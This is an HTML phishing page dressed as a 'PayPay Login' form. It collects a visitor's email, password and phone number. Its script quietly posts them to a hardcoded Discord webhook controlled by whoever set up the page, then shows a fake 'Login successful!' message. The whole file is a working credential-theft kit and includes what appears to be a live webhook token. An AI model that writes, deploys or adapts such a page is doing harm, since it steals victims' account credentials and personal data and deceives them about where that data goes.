<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPay Login</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { width: 300px; margin: 0 auto; }
        input { width: 100%; padding: 10px; margin: 5px 0; }
        button { width: 100%; padding: 10px; background-color: #0070ba; color: white; border: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>PayPay Login</h2>
        <form id="loginForm">
            <input type="email" id="email" name="email" placeholder="Email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <input type="text" id="phone" name="phone" placeholder="Phone Number" required>
            <button type="submit">Login</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const phone = document.getElementById('phone').value;

            fetch('https://discord.com/api/webhooks/1421508499632029748/y-T37VTHx0owouEAw2Ydcsd5gCk1e0wM4t7elAhFlznDr5pvjsDbjjxe2_XieNZymxt7', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password, phone })
            }).then(response => {
                if (response.ok) {
                    alert('Login successful!');
                } else {
                    alert('Login failed.');
                }
            });
        });
    </script>
</body>
</html>
